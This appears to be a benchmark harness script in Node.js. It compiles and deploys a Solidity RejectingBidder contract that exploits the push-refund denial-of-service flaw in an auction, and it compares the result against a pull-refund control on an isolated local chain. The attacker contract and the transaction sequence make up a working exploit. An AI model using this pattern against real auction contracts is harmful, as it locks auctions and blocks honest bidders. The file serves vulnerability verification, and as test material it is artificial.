'use strict';

const fs = require('node:fs');
const path = require('node:path');
const crypto = require('node:crypto');

const root = process.env.CAMPAIGN_PROJECT_ROOT || path.resolve(__dirname, '..');
const deps = path.join(root, 'flare-scan/contracts/firelight-core/node_modules');
process.env.HARDHAT_CONFIG = path.join(root, 'scripts/local-test-hardhat.cjs');
const hre = require(path.join(deps, 'hardhat'));
const { AbiCoder, BrowserProvider, Contract, ContractFactory, keccak256 } = require(path.join(deps, 'ethers'));
const solcLoader = require(path.join(root, 'flare-scan/tools/solc-0819/node_modules/solc'));
const solc = solcLoader.setupMethods(require(process.env.CAMPAIGN_SOLJSON));
const { LOCAL_CHAIN_ID, parseForkConfig, publicBoundary } = require('./dynamic-execution-boundary.cjs');

const REJECTING_BIDDER_SOURCE = `pragma solidity ^0.4.15;
contract AuctionBidTarget { function bid() public payable; }
contract RejectingBidder {
    function placeBid(address target) public payable {
        AuctionBidTarget(target).bid.value(msg.value)();
    }
    function() public payable { revert(); }
}`;

function digest(value) { return crypto.createHash('sha256').update(value).digest('hex'); }

function compile(sourceName, source) {
  const sources = {
    [sourceName]: { content: source },
    'RejectingBidder.sol': { content: REJECTING_BIDDER_SOURCE },
  };
  const input = { language: 'Solidity', sources,
    settings: { optimizer: { enabled: false }, outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } } } };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const errors = (output.errors || []).filter((item) => item.severity === 'error');
  if (errors.length) throw new Error(`source_compile_failed:${errors.map((item) => item.formattedMessage).join('\n')}`);
  return output.contracts;
}

function artifact(contracts, sourceName, contractName) {
  const item = contracts?.[sourceName]?.[contractName];
  if (!item?.abi || !item?.evm?.bytecode?.object) throw new Error(`artifact_missing:${sourceName}:${contractName}`);
  return item;
}

async function deploy(signer, item) {
  const contract = await new ContractFactory(item.abi, item.evm.bytecode.object, signer).deploy();
  const receipt = await contract.deploymentTransaction().wait();
  if (receipt.status !== 1) throw new Error('deployment_failed');
  await contract.waitForDeployment();
  return { contract, receipt };
}

async function storageWord(provider, target, slot) {
  return BigInt(await provider.send('eth_getStorageAt', [target, `0x${slot.toString(16)}`, 'latest']));
}

function wordAddress(word) {
  return `0x${word.toString(16).padStart(64, '0').slice(-40)}`.toLowerCase();
}

async function expectRejectedBid(contract, signer, value) {
  try {
    await (await contract.connect(signer).getFunction('bid')({ value, gasLimit: 500000 })).wait();
    return { status: 1, hash: null };
  } catch (error) {
    const receipt = error.receipt || error.info?.receipt || null;
    return { status: Number(receipt?.status ?? 0), hash: receipt?.hash || error.transactionHash || null };
  }
}

(async () => {
  const sourcePath = path.resolve(process.argv[2] || '');
  const sourceBytes = fs.readFileSync(sourcePath);
  const source = sourceBytes.toString('utf8');
  const sourceSha256 = digest(sourceBytes);
  const expectedSha256 = process.env.TRAINING_SOURCE_SHA256 || '';
  if (!/^[a-f0-9]{64}$/.test(expectedSha256) || sourceSha256 !== expectedSha256) {
    throw new Error('training_auction_source_hash_mismatch');
  }
  const compilerRelease = String(process.env.BENCHMARK_SOLC_VERSION || '').split('+', 1)[0];
  if (compilerRelease !== '0.4.26' || !String(solc.version()).startsWith('0.4.26+')) {
    throw new Error('training_auction_requires_exact_solc_0.4.26');
  }
  const compilerArtifactSha256 = String(process.env.BENCHMARK_SOLC_SHA256 || '').replace(/^0x/, '');
  if (!/^[a-f0-9]{64}$/i.test(compilerArtifactSha256)) throw new Error('training_auction_compiler_hash_missing');
  const fork = parseForkConfig(process.env);
  if (fork.requested || !fork.valid) throw new Error('training_auction_requires_isolated_local_evm');
  if (hre.network.name !== 'hardhat' || hre.network.config.url || hre.network.config.forking) {
    throw new Error('training_auction_evm_not_isolated');
  }

  const sourceName = path.basename(sourcePath);
  const contracts = compile(sourceName, source);
  const auctionArtifact = artifact(contracts, sourceName, 'DosAuction');
  const secureArtifact = artifact(contracts, sourceName, 'SecureAuction');
  const bidderArtifact = artifact(contracts, 'RejectingBidder.sol', 'RejectingBidder');
  const provider = new BrowserProvider(hre.network.provider);
  const chainId = Number((await provider.getNetwork()).chainId);
  if (chainId !== LOCAL_CHAIN_ID) throw new Error('training_auction_chain_id_mismatch');
  const attacker = await provider.getSigner(0);
  const victim = await provider.getSigner(1);
  const attackPrice = 1000000000000000000n;
  const victimPrice = 2000000000000000000n;
  const deployed = await Promise.all([
    deploy(attacker, auctionArtifact), deploy(attacker, secureArtifact), deploy(attacker, bidderArtifact),
  ]);
  const vulnerable = deployed[0].contract;
  const secure = deployed[1].contract;
  const bidder = deployed[2].contract;
  const vulnerableAddress = await vulnerable.getAddress();
  const secureAddress = await secure.getAddress();
  const bidderAddress = await bidder.getAddress();
  const victimAddress = (await victim.getAddress()).toLowerCase();
  const transactions = [];

  const hostileVulnerableReceipt = await (await bidder.getFunction('placeBid')(vulnerableAddress, {
    value: attackPrice, gasLimit: 500000,
  })).wait();
  transactions.push({ name: 'vulnerable_attacker_bid', status: hostileVulnerableReceipt.status,
    hash: hostileVulnerableReceipt.hash });
  const vulnerableBalanceBefore = await provider.getBalance(vulnerableAddress);
  const vulnerableLeaderBefore = wordAddress(await storageWord(provider, vulnerableAddress, 0n));
  const vulnerableBidBefore = await storageWord(provider, vulnerableAddress, 1n);
  const blockedTransaction = await expectRejectedBid(vulnerable, victim, victimPrice);
  const vulnerableBalanceAfter = await provider.getBalance(vulnerableAddress);
  const vulnerableLeaderAfter = wordAddress(await storageWord(provider, vulnerableAddress, 0n));
  const vulnerableBidAfter = await storageWord(provider, vulnerableAddress, 1n);

  const hostileSecureReceipt = await (await bidder.getFunction('placeBid')(secureAddress, {
    value: attackPrice, gasLimit: 500000,
  })).wait();
  transactions.push({ name: 'secure_attacker_bid', status: hostileSecureReceipt.status,
    hash: hostileSecureReceipt.hash });
  const secureVictimReceipt = await (await secure.connect(victim).getFunction('bid')({
    value: victimPrice, gasLimit: 500000,
  })).wait();
  transactions.push({ name: 'secure_victim_bid', status: secureVictimReceipt.status,
    hash: secureVictimReceipt.hash });
  const secureLeaderAfter = wordAddress(await storageWord(provider, secureAddress, 0n));
  const secureBidAfter = await storageWord(provider, secureAddress, 1n);
  const secureBalanceAfter = await provider.getBalance(secureAddress);
  const refundSlot = BigInt(keccak256(AbiCoder.defaultAbiCoder().encode(['address', 'uint256'], [bidderAddress, 2n])));
  const secureRefundCredit = await storageWord(provider, secureAddress, refundSlot);

  const vulnerableBlocked = blockedTransaction.status === 0
    && vulnerableLeaderBefore === bidderAddress.toLowerCase()
    && vulnerableLeaderAfter === bidderAddress.toLowerCase()
    && vulnerableBidBefore === attackPrice && vulnerableBidAfter === attackPrice
    && vulnerableBalanceBefore === attackPrice && vulnerableBalanceAfter === attackPrice;
  const secureProgress = secureVictimReceipt.status === 1
    && secureLeaderAfter === victimAddress && secureBidAfter === victimPrice
    && secureBalanceAfter === attackPrice + victimPrice && secureRefundCredit === attackPrice;
  const confirmed = vulnerableBlocked && secureProgress && transactions.every((transaction) => transaction.status === 1);
  const assertions = [
    { name: 'rejecting_leader_blocks_higher_bid_and_preserves_stuck_state', passed: vulnerableBlocked },
    { name: 'pull_refund_control_accepts_victim_bid_and_credits_prior_bidder', passed: secureProgress },
  ];
  const result = {
    schemaVersion: 1, sampleId: 'crytic-dos-auction', state: confirmed ? 'confirmed' : 'unconfirmed',
    confirmedVulnerability: confirmed, vulnerability: 'denial_of_service_push_refund',
    proofScope: 'An auction leader whose fallback rejects payment can keep the push-refund auction at the old leader and bid when a victim tries a higher bid; the same sequence progresses in the pull-refund control.',
    mode: 'isolated_in_process', compilerVersion: solc.version(), compilerArtifactSha256,
    compilerKind: 'solc-js-original-source', sourceSha256,
    targetAddresses: { vulnerable: vulnerableAddress, secureControl: secureAddress, rejectingBidder: bidderAddress },
    vulnerableAuction: {
      leaderBefore: vulnerableLeaderBefore, leaderAfter: vulnerableLeaderAfter,
      bidBeforeWei: vulnerableBidBefore.toString(), bidAfterWei: vulnerableBidAfter.toString(),
      balanceBeforeWei: vulnerableBalanceBefore.toString(), balanceAfterWei: vulnerableBalanceAfter.toString(),
    },
    secureControl: { leaderAfter: secureLeaderAfter, bidAfterWei: secureBidAfter.toString(),
      balanceAfterWei: secureBalanceAfter.toString(), rejectingBidderRefundCreditWei: secureRefundCredit.toString() },
    blockedTransaction: { ...blockedTransaction, reason: 'prior_leader_rejected_push_refund' },
    checkedReverted: blockedTransaction.status === 0, transactionStatus: secureVictimReceipt.status,
    transactions, assertions,
    executionBoundary: publicBoundary(fork, { chainId, forkState: 'not_performed' }),
    reason: confirmed ? null : 'auction_dos_state_or_pull_refund_control_assertion_failed',
  };
  process.stdout.write(`${JSON.stringify(result)}\n`);
  if (!confirmed) process.exitCode = 1;
})().catch((error) => {
  process.stderr.write(`${error.stack || error}\n`);
  process.exitCode = 2;
});
